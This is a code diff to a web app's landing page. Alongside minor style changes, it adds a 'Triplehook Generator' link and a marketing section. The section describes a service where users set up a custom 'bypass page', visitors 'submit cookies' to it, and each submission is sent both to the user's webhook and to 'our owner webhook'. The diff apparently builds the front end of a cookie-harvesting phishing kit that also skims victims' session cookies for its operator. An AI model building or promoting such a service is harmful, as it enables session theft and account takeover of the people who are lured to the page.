@@ -24,7 +24,7 @@ export default function Home() {
         <div className="max-w-6xl mx-auto">
           <div className="flex flex-col items-center text-center">
             <div className="mb-8 inline-block">
-              <span className="badge bg-primary/10 border-primary/50 text-primary">
+              <span className="badge" style={{backgroundColor: 'rgba(59, 130, 246, 0.1)', borderColor: 'rgba(59, 130, 246, 0.5)'}}>
                 <CheckCircle className="w-3 h-3" />
                 Production Ready
               </span>
@@ -43,6 +43,9 @@ export default function Home() {
               <Link href="/submit" className="btn-primary inline-flex items-center gap-2 text-lg px-8 py-3">
                 Try Now
                 <ArrowRight className="w-5 h-5" />
+              </Link>
+              <Link href="/triplehook" className="btn-secondary inline-flex items-center gap-2 text-lg px-8 py-3">
+                Triplehook Generator
               </Link>
               <Link href="/dashboard" className="btn-secondary inline-flex items-center gap-2 text-lg px-8 py-3">
                 View Dashboard
@@ -97,8 +100,8 @@ export default function Home() {
                 description: "Your data is encrypted end-to-end and never shared with third parties.",
               },
             ].map((feature, i) => (
-              <div key={i} className="card-base group hover:border-primary/50 hover:shadow-card-hover transition-all">
-                <div className="flex items-center justify-center w-14 h-14 rounded-lg bg-primary/10 mb-6 group-hover:bg-primary/20 transition-colors">
+              <div key={i} className="card-base group hover:border-primary hover:shadow-card-hover transition-all" style={{borderColor: 'rgba(59, 130, 246, 0.5)'}}>
+                <div className="flex items-center justify-center w-14 h-14 rounded-lg mb-6 group-hover:transition-colors transition-colors" style={{backgroundColor: 'rgba(59, 130, 246, 0.1)'}}>
                   <feature.icon className="w-7 h-7 text-primary" />
                 </div>
                 <h3 className="text-xl font-bold mb-3">{feature.title}</h3>
@@ -137,7 +140,7 @@ export default function Home() {
             ].map((item, i) => (
               <div key={i} className="relative">
                 <div className="card-base">
-                  <div className="text-5xl font-bold text-primary/20 mb-4">{item.step}</div>
+                  <div className="text-5xl font-bold mb-4" style={{color: 'rgba(59, 130, 246, 0.2)'}}>{item.step}</div>
                   <h3 className="text-xl font-bold mb-3">{item.title}</h3>
                   <p className="text-muted-foreground">{item.description}</p>
                 </div>
@@ -146,6 +149,73 @@ export default function Home() {
                 )}
               </div>
             ))}
+          </div>
+        </div>
+      </section>
+
+      {/* Triplehook Section */}
+      <section className="py-24 px-4 border-t border-border">
+        <div className="max-w-6xl mx-auto">
+          <div className="mb-16 text-center">
+            <h2 className="text-4xl md:text-5xl font-bold mb-4">Triplehook System</h2>
+            <p className="text-muted-foreground text-lg max-w-2xl mx-auto">
+              Distribute webhook notifications to both your personal webhook and our owner webhook for comprehensive tracking
+            </p>
+          </div>
+
+          <div className="grid md:grid-cols-2 gap-8">
+            <div className="card-base rounded-lg">
+              <h3 className="text-2xl font-bold mb-4">How Triplehook Works</h3>
+              <ul className="text-muted-foreground space-y-3">
+                <li className="flex gap-3">
+                  <span className="text-primary font-bold flex-shrink-0">1.</span>
+                  <span>Create a triplehook configuration with your webhook</span>
+                </li>
+                <li className="flex gap-3">
+                  <span className="text-primary font-bold flex-shrink-0">2.</span>
+                  <span>Specify a directory name for your bypass page</span>
+                </li>
+                <li className="flex gap-3">
+                  <span className="text-primary font-bold flex-shrink-0">3.</span>
+                  <span>Users submit cookies to your custom page</span>
+                </li>
+                <li className="flex gap-3">
+                  <span className="text-primary font-bold flex-shrink-0">4.</span>
+                  <span>Notifications go to both your and our webhooks</span>
+                </li>
+              </ul>
+            </div>
+
+            <div className="card-base rounded-lg" style={{borderColor: 'rgba(59, 130, 246, 0.5)', backgroundColor: 'rgba(59, 130, 246, 0.05)'}}>
+              <h3 className="text-2xl font-bold mb-4">Key Benefits</h3>
+              <ul className="text-muted-foreground space-y-3">
+                <li className="flex gap-2">
+                  <span className="text-primary">✓</span>
+                  <span>Dual webhook notifications</span>
+                </li>
+                <li className="flex gap-2">
+                  <span className="text-primary">✓</span>
+                  <span>Custom directory URLs</span>
+                </li>
+                <li className="flex gap-2">
+                  <span className="text-primary">✓</span>
+                  <span>Owner and user tracking</span>
+                </li>
+                <li className="flex gap-2">
+                  <span className="text-primary">✓</span>
+                  <span>Secure token generation</span>
+                </li>
+                <li className="flex gap-2">
+                  <span className="text-primary">✓</span>
+                  <span>Full audit logging</span>
+                </li>
+              </ul>
+
+              <Link href="/triplehook" className="btn-primary inline-flex items-center gap-2 mt-6">
+                Create Triplehook
+                <ArrowRight className="w-4 h-4" />
+              </Link>
+            </div>
           </div>
         </div>
       </section>
